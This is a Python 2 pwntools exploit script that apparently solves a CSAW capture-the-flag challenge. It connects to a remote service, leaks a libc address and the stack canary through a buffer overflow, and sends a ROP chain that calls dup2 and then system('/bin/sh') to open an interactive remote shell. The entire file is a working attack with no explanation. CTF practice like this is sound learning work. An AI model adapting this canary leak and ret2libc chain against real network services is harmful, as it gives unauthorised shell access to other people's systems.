#!/usr/bin/env python2

from pwn import *
from struct import pack

p = remote('pwn.chal.csaw.io', 8002)

p.recvuntil('>')
p.sendline('1')
t = p.recvline()
addr = int(t[len('Reference:'):], 16)
libc_base = addr - 0x6f860
print '[+] addr = %#x' % (addr,)
print '[+] libc_base @ %#x' % (libc_base,)
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('A'*311)
t = p.recvuntil('>')
t = t[312:t.index('-Tutorial')]
canary = u64(t[:8])
print '[+] canary = %#x' % (canary,)

p.sendline('2')
p.recvuntil('>')

system_addr = libc_base + 0x00046590
binsh_addr = libc_base + 0x0017c8c3
dup2_addr = libc_base + 0x000ebe90
poppop = libc_base + 0x000000000003b8d2
pop_rdi = libc_base + 0x22b9a
pop_rsi = libc_base + 0x24885

payload = ''
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(dup2_addr)
payload += p64(pop_rsi)
payload += p64(1)
payload += p64(dup2_addr)
payload += p64(pop_rsi)
payload += p64(2)
payload += p64(dup2_addr)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(0x4242424242424242)

p.sendline(cyclic(312) + p64(canary) + 'A'*8 + payload)
p.sendline('ls')

p.interactive()
